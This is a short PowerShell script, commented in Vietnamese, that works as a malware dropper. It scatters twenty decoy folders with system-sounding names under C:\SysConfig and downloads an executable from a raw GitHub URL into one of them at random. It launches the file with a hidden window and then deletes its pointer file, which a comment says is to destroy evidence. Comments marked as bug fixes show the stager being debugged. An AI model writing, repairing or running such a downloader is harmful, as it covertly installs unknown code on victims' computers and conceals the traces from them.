$d = 'C:\SysConfig'
md $d -Force | Out-Null
$n = 'SysLog','NetSec','DataVault','CoreAuth','WinAudit'
1..20 | ForEach-Object {
    $r = $n[(Get-Random -Max 5)] + $_
    $p = Join-Path $d $r
    md $p -Force | Out-Null
    'sys' | Out-File ($p + '\info.txt')
    'log' | Out-File ($p + '\config.dat')
}

# Chọn ngẫu nhiên 1 thư mục và lưu vào file .ptr
$tgt = Join-Path $d ($n[(Get-Random -Max 5)] + (Get-Random -Min 1 -Max 21))
$tgt | Out-File "$d\.ptr"

# SỬA LỖI 1: Trim() để xóa dấu xuống dòng thừa
$ptr = (Get-Content "$d\.ptr").Trim()

# SỬA LỖI 2: Đổi đuôi thành .exe để Windows hiểu đây là file chạy
$t = Join-Path $ptr 'main.exe'

# SỬA LỖI 3: Bật TLS 1.2 để tải file từ Github không bị lỗi
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Tải file (dùng -OutFile thay vì -o để chuẩn cú pháp)
iwr 'https://raw.githubusercontent.com/honggiabao2911/a/main/main.exe' -OutFile $t -UseBasicParsing

# Chạy file ngầm
Start-Process $t -WindowStyle Hidden

# Xóa file .ptr để phi tang
Remove-Item "$d\.ptr" -Force
